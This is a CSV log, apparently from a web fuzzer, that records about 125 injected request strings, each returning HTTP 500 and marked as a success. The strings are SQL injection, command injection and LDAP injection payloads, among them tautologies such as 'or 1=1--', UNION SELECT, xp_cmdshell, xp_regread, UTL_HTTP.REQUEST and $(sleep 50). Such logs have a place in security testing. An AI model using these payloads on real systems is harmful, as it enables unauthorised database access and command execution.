id,response,lines,word,chars,request,success
4,500,3,19,113,-,1
24,500,3,23,137,')%20or%20('x'='x,1
6,500,3,21,119,'%20--,1
23,500,3,23,173,"""%20or%20""x""=""x",1
18,500,3,23,135,'or%20select *,1
1,500,3,19,113,',1
3,500,3,19,113,#,1
2,500,3,19,123,"""",1
25,500,3,23,127,0 or 1=1,1
10,500,3,21,117,=%20;,1
21,500,3,23,129,'%20or%20''=',1
17,500,3,23,153,\x27\x6F\x72 SELECT *,1
16,500,3,23,153,\x27\x4F\x52 SELECT *,1
19,500,3,19,127,admin'--,1
22,500,3,23,133,'%20or%20'x'='x,1
15,500,3,21,129,\x3D%20\x27,1
14,500,3,21,131,\x3D%20\x3B',1
20,500,3,19,149,"<>""'%;)(&+",1
12,500,3,19,119,\x23,1
13,500,3,19,119,\x27,1
9,500,3,21,117,=%20',1
11,500,3,21,119,=%20--,1
8,500,3,21,117,'%20;,1
5,500,3,19,115,--,1
7,500,3,19,119,--';,1
26,500,3,25,133,' or 0=0 --,1
28,500,3,23,129,or 0=0 --,1
30,500,3,25,141,""" or 0=0 #",1
27,500,3,25,143,""" or 0=0 --",1
29,500,3,25,131,' or 0=0 #,1
31,500,3,23,127,or 0=0 #,1
33,500,3,23,141,""" or 1=1--",1
37,500,3,21,123,or%201=1,1
39,500,3,27,143,' or 1=1 or ''=',1
36,500,3,21,127,or 1=1--,1
38,500,3,23,129,or%201=1 --,1
35,500,3,25,155,"""' or 1 --'""",1
32,500,3,23,131,' or 1=1--,1
34,500,3,23,139,' or '1'='1'--,1
40,500,3,27,183,""" or 1=1 or """"=""",1
42,500,3,23,173,""" or ""a""=""a",1
46,500,3,25,147,"hi"" or 1=1 --",1
51,500,3,23,143,'hi' or 'x'='x';,1
52,500,3,19,129,@variable,1
50,500,3,23,181,"hi"") or (""a""=""a",1
49,500,3,23,141,hi') or ('a'='a,1
48,500,3,23,137,hi' or 'a'='a,1
45,500,3,23,177,"hi"" or ""a""=""a",1
47,500,3,25,137,hi' or 1=1 --,1
44,500,3,23,177,""") or (""a""=""a",1
43,500,3,23,137,') or ('a'='a,1
41,500,3,23,131,' or a=a--,1
53,500,3,19,131,",@variable",1
55,500,3,21,143,PRINT @@variable,1
57,500,3,19,123,insert,1
54,500,3,19,121,PRINT,1
56,500,3,19,123,select,1
58,500,3,19,115,as,1
60,500,3,19,129,procedure,1
64,500,3,19,119,desc,1
59,500,3,19,115,or,1
68,500,3,19,123,having,1
69,500,3,19,127,truncate,1
67,500,3,19,127,distinct,1
70,500,3,19,125,replace,1
61,500,3,19,121,limit,1
66,500,3,19,123,update,1
65,500,3,19,123,delete,1
63,500,3,19,117,asc,1
62,500,3,21,127,order by,1
79,500,3,21,125,exec xp,1
88,500,3,23,137,' or (EXISTS),1
71,500,3,19,119,like,1
73,500,3,19,129,bfilename,1
83,500,3,25,219,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
77,500,3,27,143,' or uid like '%,1
76,500,3,27,149,' or userid like '%,1
75,500,3,27,147,' or uname like '%,1
72,500,3,19,125,handler,1
74,500,3,27,153,' or username like '%,1
89,500,3,25,141,' (select top 1,1
81,500,3,23,165,'; exec master..xp_cmdshell,1
78,500,3,27,145,' or user like '%,1
80,500,3,21,125,exec sp,1
91,500,3,21,131,1;SELECT%20*,1
84,500,3,19,137,--sp_password,1
86,500,3,23,139,' UNION SELECT,1
85,500,3,21,143,\x27UNION SELECT,1
82,500,3,23,147,'; exec xp_regread,1
87,500,3,25,147,' UNION ALL SELECT,1
94,500,3,18,111,&lt;&gt;&quot;'%;)(&amp;+,1
97,500,3,22,135,%20$(sleep%2050),1
99,500,3,19,143,char%4039%41%2b%40SELECT,1
98,500,3,22,133,%20'sleep%2050',1
95,500,3,23,127,'%20or%201=1,1
90,500,3,19,149,'||UTL_HTTP.REQUEST,1
96,500,3,23,127,%27%20or%201=1,1
92,500,3,19,141,to_timestamp_tz,1
100,500,3,18,111,&apos;%20OR,1
93,500,3,19,129,tz_offset,1
106,500,3,19,115,%2A%7C,1
102,500,3,19,137,(sqlattempt2),1
103,500,3,19,113,|,1
101,500,3,19,135,'sqlattempt1,1
105,500,3,19,115,*|,1
104,500,3,19,113,%7C,1
107,500,3,19,135,*(|(mail=*)),1
110,500,3,19,149,%2A%28%7C%28objectclass%3D%2A%29%29,1
108,500,3,19,135,%2A%28%7C%28mail%3D%2A%29%29,1
112,500,3,19,113,%28,1
111,500,3,19,113,(,1
109,500,3,19,149,*(|(objectclass=*)),1
114,500,3,19,113,%29,1
115,500,3,18,111,&,1
113,500,3,19,113,),1
117,500,3,19,113,!,1
118,500,3,19,113,%21,1
116,500,3,19,121,%26,1
119,500,3,27,143,' or 1=1 or ''=',1
120,500,3,23,129,' or ''=',1
122,500,3,19,113,/,1
123,500,3,19,115,//,1
121,500,3,27,149,x' or 1=1 or 'x'='y,1
125,500,3,19,117,*/*,1
124,500,3,19,117,//*,1
